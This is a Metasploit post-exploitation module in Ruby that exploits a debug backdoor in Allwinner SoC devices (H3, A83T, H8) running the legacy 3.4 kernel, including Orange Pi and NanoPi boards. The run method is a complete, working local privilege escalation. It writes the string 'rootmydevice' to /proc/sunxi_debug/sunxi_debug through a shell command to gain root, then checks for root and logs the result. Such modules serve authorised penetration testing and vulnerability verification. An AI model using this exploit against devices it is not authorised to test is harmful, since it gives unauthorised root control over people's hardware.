##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require "msf/core"

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv

  def initialize(info = {})
    super(update_info(info,
        "Name"           => "Allwinner 3.4 Legacy Kernel Local Privilege Escalation",
        "Description"    => %q{
          This module attempts to exploit a debug backdoor privilege escalation in
          Allwinner SoC based devices.
          Vulnerable Allwinner SoC chips: H3, A83T or H8 which rely on Kernel 3.4
          Vulnerable OS: all OS images available for Orange Pis,
                         any for FriendlyARM's NanoPi M1,
                         SinoVoip's M2+ and M3,
                         Cuebietech's Cubietruck +
                         Linksprite's pcDuino8 Uno
          Exploitation may be possible against Dragon (x10) and Allwinner Android tablets
        },
        "License"        => MSF_LICENSE,
        "Author"         =>
          [
            "h00die <mike@stcyrsecurity.com>",  # Module
            "KotCzarny"                         # Discovery
          ],
        "Platform"       => [ "android", "linux" ],
        "DisclosureDate" => "Apr 30 2016",
        "References"     =>
          [
            [ "URL", "http://forum.armbian.com/index.php/topic/1108-security-alert-for-allwinner-sun8i-h3a83th8/"],
            [ "URL", "https://webcache.googleusercontent.com/search?q=cache:l2QYVUcDflkJ:" \
                     "https://github.com/allwinner-zh/linux-3.4-sunxi/blob/master/arch/arm/mach-sunxi/sunxi-debug.c+&cd=3&hl=en&ct=clnk&gl=us"],
            [ "URL", "http://irclog.whitequark.org/linux-sunxi/2016-04-29#16314390"]
          ],
        "SessionTypes"   => [ "shell", "meterpreter" ]
      ))
  end

  def run
    backdoor = "/proc/sunxi_debug/sunxi_debug"
    if file_exist?(backdoor)
      vprint_good "Backdoor found, exploiting."
      cmd_exec("echo rootmydevice > #{backdoor}")
      if is_root?
        print_good "Privilege Escalation Successful"
        report_vuln(
          host: session.session_host,
          name: self.name,
          refs: self.references,
          info: 'Escalated to root shell via Allwinner backdoor'
        )
      else
        print_error "Privilege Escalation FAILED"
      end
    else
      print_error "Backdoor #{backdoor} not found."
    end
  end
end
